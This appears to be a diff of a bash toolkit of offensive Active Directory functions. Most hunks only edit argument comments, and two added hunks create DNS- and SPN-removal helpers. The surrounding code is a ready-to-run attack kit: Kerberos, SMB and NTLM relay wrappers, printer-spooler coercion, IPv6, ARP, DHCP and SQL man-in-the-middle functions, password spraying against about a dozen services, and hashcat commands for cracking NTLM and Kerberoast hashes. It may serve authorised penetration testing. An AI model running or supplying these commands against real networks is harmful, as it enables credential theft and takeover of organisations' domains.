-    # ARGUMENT: TCOMPUTER, TPASSWORD, TGROUP.
+    # ARGUMENT: addComputer TCOMPUTER, TPASSWORD, TGROUP.
     TCOMPUTER=$1;
     TPASSWORD=$2;
     TGROUP=$3;
@@ -1423,7 +1423,7 @@ function addComputer(){
 
 function getST(){
     # DESCRIPTION: Get TGT on target domain.
-    # ARGUMENT: SPN, TARGET.
+    # ARGUMENT: getST SPN, TARGET.
     SPN=$1;
     TARGET=$2;
     proxychains \
@@ -1436,7 +1436,7 @@ function getST(){
 
 function addDNS(){
     # DESCRIPTION: Add DNS on target domain  using computer or user password or hashes.
-    # ARGUMENT: IPADDRESS, SPNHOST, SERVER.
+    # ARGUMENT: addDNS IPADDRESS, SPNHOST, SERVER.
     IPADDRESS=$1;
     SPNHOST=$2;
     SERVER=$3;
@@ -1450,7 +1450,7 @@ function addDNS(){
 
 function queryDNS(){
     # DESCRIPTION: Query DNS on target domain using computer or user password or hashes.
-    # ARGUMENT: IPADDRESS, SPNHOST, SERVER.
+    # ARGUMENT: queryDNS IPADDRESS, SPNHOST, SERVER.
     IPADDRESS=$1;
     SPNHOST=$2;
     SERVER=$3;
@@ -1464,7 +1464,7 @@ function queryDNS(){
 
 function removeDNS(){
     # DESCRIPTION: Remove DNS on target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: IPADDRESS, SPNHOST, SERVER.
+    # ARGUMENT: removeDNS IPADDRESS, SPNHOST, SERVER.
     IPADDRESS=$1;
     SPNHOST=$2;
     SERVER=$3;
@@ -1476,9 +1476,24 @@ function removeDNS(){
     return;
 }
 
+function removeDNSExact(){
+    # DESCRIPTION: Remove exact DNS on target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: removeDNSExact IPADDRESS, SPN, SERVER.
+    IPADDRESS=$1;
+    SPN=$2;
+    SERVER=$3;
+    proxychains \
+    dnstool.py \
+    -u "${DOMAIN}\\${USER}" \
+    -p $PASSWORD \
+    -r $SPN -a remove -d $IPADDRESS $SERVER;
+    return;
+}
+
+
 function removeSPN(){
     # DESCRIPTION: Remove SPN from target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: SPNHOST, SERVER.
+    # ARGUMENT: removeSPN SPNHOST, SERVER.
     SPNHOST=$1;
     SERVER=$2;
     proxychains \
@@ -1486,13 +1501,27 @@ function removeSPN(){
     -u "${DOMAIN}\\${USER}" \
     -p $PASSWORD \
     -s "HOST/PWN-${SPNHOST}" \
-    -r "ldap://${SERVER}";
+    --additional -r "ldap://${SERVER}";
+    return;
+}
+
+function removeSPNExact(){
+    # DESCRIPTION: Remove specific SPN from target system using DOMAIN computer or user password or hashes.
+    # ARGUMENT: removeSPNExact SPN, SERVER.
+    SPN=$1;
+    SERVER=$2;
+    proxychains \
+    addspn.py \
+    -u "${DOMAIN}\\${USER}" \
+    -p $PASSWORD \
+    -s $SPN \
+    --additional -r "ldap://${SERVER}";
     return;
 }
 
 function querySPN(){
     # DESCRIPTION: Query SPN on target system using DOMAIN computer or user password or hashes.
-    # ARGUMENT: SPNHOST, SERVER.
+    # ARGUMENT: querySPN SPNHOST, SERVER.
     SPNHOST=$1;
     SERVER=$2;
     proxychains \
@@ -1506,7 +1535,7 @@ function querySPN(){
 
 function addSPN(){
     # DESCRIPTION: Add SPN on target system using computer or user password or hashes.
-    # ARGUMENT: SPNHOST, SERVER.
+    # ARGUMENT: addSPN SPNHOST, SERVER.
     SPNHOST=$1;
     SERVER=$2;
     proxychains \
@@ -1520,7 +1549,7 @@ function addSPN(){
 
 function krbRelayUser(){
     # DESCRIPTION: KRP relay for target AD user with uppercase DOMAIN.
-    # ARGUMENT: TDOMAIN, TUSER, TPASSWORD.
+    # ARGUMENT: krbRelayUser TDOMAIN, TUSER, TPASSWORD.
     TDOMAIN=$1;
     TUSER=$2;
     TPASSWORD=$3;
@@ -1532,7 +1561,7 @@ function krbRelayUser(){
 
 function krbRelayComputer(){
     # DESCRIPTION: KRP relay for target AD computer using AES-256 hash.
-    # ARGUMENT: AES256HASH.
+    # ARGUMENT: krbRelayUser AES256HASH.
     AES256HASH=$1;
     python krbrelayx.py \
     -aesKey $AES256HASH;
@@ -1541,7 +1570,7 @@ function krbRelayComputer(){
 
 function krbExportTGT(){
     # DESCRIPTION: Export the TGT CCACHE file after Kerberos relay.
-    # ARGUMENT: CACHE
+    # ARGUMENT: krbExportTGT CACHE
     CACHE=$1;
     export KRB5CCNAME=${CACHE};
     return;
@@ -1549,7 +1578,7 @@ function krbExportTGT(){
 
 function printerRelay(){
     # DESCRIPTION: Print spool MSRPC on target system FQDN of the DC or server.
-    # ARGUMENT: DCFQDN, SPNHOST.
+    # ARGUMENT: printerRelay DCFQDN, SPNHOST.
     DCFQDN=$1;
     SPNHOST=$2;
     proxychains \
@@ -1561,7 +1590,7 @@ function printerRelay(){
 
 function smbRelay(){
     # DESCRIPTION: SMB relay to remote target.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: smbRelay TARGET.
     TARGET=$1;
     smbrelayx.py \
     -ts -debug \
@@ -1572,7 +1601,7 @@ function smbRelay(){
 
 function ntlmRelay(){
     # DESCRIPTION: NTLM relay to target systems.
-    # ARGUMENT: TARGETS.
+    # ARGUMENT: ntlmRelay TARGETS.
     TARGETS=$1
     ntlmrelayx.py -ts  \
     -tf "./${TARGETS}" \
@@ -1588,7 +1617,7 @@ function ntlmRelay(){
 
 function respondRelay(){
     # DESCRIPTION: Responder for NTLM relay attack.
-    # ARGUMENT: None.
+    # ARGUMENT: respondRelay None.
     responder -v \
     -I eth0 -dwrf -P -v;
     return;
@@ -1596,7 +1625,7 @@ function respondRelay(){
 
 function ntlmRelaySix(){
     # DESCRIPTION: NTLM relay using IPv6 attack.
-    # ARGUMENT: TARGETS, WPAD.
+    # ARGUMENT: ntlmRelaySix TARGETS, WPAD.
     TARGETS=$1
     WPAD=$2;
     ntlmrelayx.py -6  \
@@ -1614,7 +1643,7 @@ function ntlmRelaySix(){
 
 function mitmSix(){
     # DESCRIPTION: MITM attack using IPv6 DHCP.
-    # ARGUMENT: TARGET.
+    # ARGUMENT: mitmSix TARGET.
     TARGET=$1
     mitm6.py -d $DOMAIN \
     -hw $TARGET;
@@ -1623,7 +1652,7 @@ function mitmSix(){
 
 function arpSpoof(){
     # DESCRIPTION: MITM attack using ARP spoofing.
-    # ARGUMENT: TARGETSERVER, TARGETCLIENT, PORT, GATEWAY, ATTACKER.
+    # ARGUMENT: arpSpoof TARGETSERVER, TARGETCLIENT, PORT, GATEWAY, ATTACKER.
     TARGETSERVER=$1;
 	TARGETCLIENT=$2;
 	PORT=$3;
@@ -1645,7 +1674,7 @@ function arpSpoof(){
 
 function dhcpSpoof() {
     # DESCRIPTION: MITM attack using DHCP spoofing.
-    # ARGUMENT: TARGETDNS, PORT, ATTACKER.
+    # ARGUMENT: dhcpSpoof TARGETDNS, PORT, ATTACKER.
 	TARGETDNS=$1;
 	PORT=$2;
 	ATTACKER=$3;
@@ -1669,7 +1698,7 @@ function dhcpSpoof() {
 
 function sqlMITM(){
     # DESCRIPTION: MITM attack against SQL/MSSQL services.
-    # ARGUMENT: CLIENTIP, SERVERIP, BEGIN, END, QUERY.
+    # ARGUMENT: sqlMITM CLIENTIP, SERVERIP, BEGIN, END, QUERY.
     CLIENTIP=$1;
     SERVERIP=$2;
     BEGIN=$3;
@@ -1686,7 +1715,7 @@ function sqlMITM(){
 
 function sprayHTTP(){
     # DESCRIPTION: Password spraying attack against HTTP.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayHTTP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1699,7 +1728,7 @@ function sprayHTTP(){
 
 function sprayHTTPNTLM(){
     # DESCRIPTION: Password spraying attack against HTTP-NTLM.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayHTTPNTLM TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1712,7 +1741,7 @@ function sprayHTTPNTLM(){
 
 function sprayADFS(){
     # DESCRIPTION: Password spraying attack against ADFS.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayADFS TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1725,7 +1754,7 @@ function sprayADFS(){
 
 function sprayIMAP(){
     # DESCRIPTION: Password spraying attack against IMAP.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayIMAP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1738,7 +1767,7 @@ function sprayIMAP(){
 
 function sprayLDAP(){
     # DESCRIPTION: Password spraying attack against LDAP.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayLDAP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1751,7 +1780,7 @@ function sprayLDAP(){
 
 function sprayMSSQL(){
     # DESCRIPTION: Password spraying attack against MSSQL.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayMSSQL TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1764,7 +1793,7 @@ function sprayMSSQL(){
 
 function sprayPSRM(){
     # DESCRIPTION: Password spraying attack against WinRM/PSRP.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayPSRM TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1777,7 +1806,7 @@ function sprayPSRM(){
 
 function spraySMB(){
     # DESCRIPTION: Password spraying attack against SMB.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: spraySMB TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1790,7 +1819,7 @@ function spraySMB(){
 
 function spraySMTP(){
     # DESCRIPTION: Password spraying attack against SMTP.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: spraySMTP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1803,7 +1832,7 @@ function spraySMTP(){
 
 function sprayWinRM(){
     # DESCRIPTION: Password spraying attack against WinRM.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayWinRM TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1816,7 +1845,7 @@ function sprayWinRM(){
 
 function sprayWMI(){
     # DESCRIPTION: Password spraying attack against WMI.
-    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
+    # ARGUMENT: sprayWMI TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
     TARGET=$1;
     TARGETDOMAIN=$2;
     DICTIONARY=$3;
@@ -1831,7 +1860,7 @@ function sprayWMI(){
 
 function crackLMNT(){
     # DESCRIPTION: Crack LM/NT hashes.
-    # ARGUMENT: TARGET, DICTIONARY.
+    # ARGUMENT: crackLMNT TARGET, DICTIONARY.
     TARGET=$1;
     DICTIONARY=$2;
     hashcat -m 1000 -a 0 $TARGET $DICTIONARY --force
@@ -1840,7 +1869,7 @@ function crackLMNT(){
 
 function crackNTLM1(){
     # DESCRIPTION: Crack NTLMv1 hashes.
-    # ARGUMENT: TARGET, DICTIONARY.
+    # ARGUMENT: crackNTLM1 TARGET, DICTIONARY.
     TARGET=$1;
     DICTIONARY=$2;
     hashcat -m 5500 -a 0 $TARGET $DICTIONARY --force
@@ -1849,7 +1878,7 @@ function crackNTLM1(){
 
 function crackNTLM2(){
     # DESCRIPTION: Crack NTLMv2 hashes.
-    # ARGUMENT: TARGET, DICTIONARY.
+    # ARGUMENT: crackNTLM2 TARGET, DICTIONARY.
     TARGET=$1;
     DICTIONARY=$2;
     hashcat -m 5600 -a 0 $TARGET $DICTIONARY --force
@@ -1858,7 +1887,7 @@ function crackNTLM2(){
 
 function crackCached2(){
     # DESCRIPTION: Crack ADv2 cached hashes.
-    # ARGUMENT: TARGET, DICTIONARY.
+    # ARGUMENT: crackCached2 TARGET, DICTIONARY.
     TARGET=$1;
     DICTIONARY=$2;
     hashcat -m 2100 -a 0 $TARGET $DICTIONARY --force
@@ -1867,7 +1896,7 @@ function crackCached2(){
 
 function crackSPNs(){
     # DESCRIPTION: Crack SPN hashes.
-    # ARGUMENT: TARGET, DICTIONARY.
+    # ARGUMENT: crackSPNs TARGET, DICTIONARY.
     TARGET=$1;
     DICTIONARY=$2;
     hashcat -m 13100 -a 0 $TARGET $DICTIONARY --force
